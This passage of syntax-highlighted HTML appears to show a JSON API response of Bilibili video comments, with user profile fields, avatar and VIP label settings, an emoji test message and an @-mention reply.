<span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_critical_group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;emojitest 😁😂😃😄👿😉😊☺️😌😍😏😒😓😔😘😚😜😝😞😠😡😢😣😥😨😪😭😰😱😲😳😷🙃😋😗😛🤑🤓😎🤗🙄🤔😩😤🤐🤒😴😀😆😅😇🙂😙😟😕☹️😫😶😐😑😯😦😧😮😵😬🤕😈👻🥺🥴🤣🥰🤩🤤🤫🤪🧐🤬🤧🤭🤠🤯🤥🥳🤨🤢🤡🤮🥵🥶💩☠️💀👽👾👺👹🤖&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;members&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;jump_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;assist&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;up_action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reply&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;invisible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;reply_control&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;time_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3天前发布&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;translation_switch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;folder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;has_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rule&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dynamic_id_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;note_cvid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;track_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270936082385</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">362747247</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">455215669</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rcount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;fansgrade&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ctime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1754906716</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;362747247&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rpid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;270936082385&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Aidemofashi_&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;男&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aidemofashi_爱的魔法尸\nemail:zhonghuaiyu2019@163.com&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;face_nft_new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/d7b702ef65a976b20ed854cbd04cb9e27341bb79.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/KJunwh19T5.png&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fans_detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user_sailing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_contractor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;contract_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nft_interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar_item&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;container_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fallback_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;layer_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;AVATAR_LAYER&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;is_critical&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;layer_mask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;mask_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;draw&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;draw_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;fill_mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;color_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                        <span class="hljs-attr">&quot;day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                            <span class="hljs-attr">&quot;argb&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FF000000&quot;</span><br>                                                        <span class="hljs-punctuation">&#125;</span><br>                                                    <span class="hljs-punctuation">&#125;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;res_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;res_image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;image_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;remote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;bfs_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;widget-layer-avatar&quot;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_critical_group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;@不起名发不了评论&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;at_name_to_mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;不起名发不了评论&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1364672894</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;at_name_to_mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;不起名发不了评论&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1364672894&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;members&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                        <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1364672894&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;不起名发不了评论&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;保密&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;素质不详&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i2.hdslb.com/bfs/face/8b2fdc40200902cb777f7af54759aeb117b76ace.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;face_nft_new&quot;</span><span 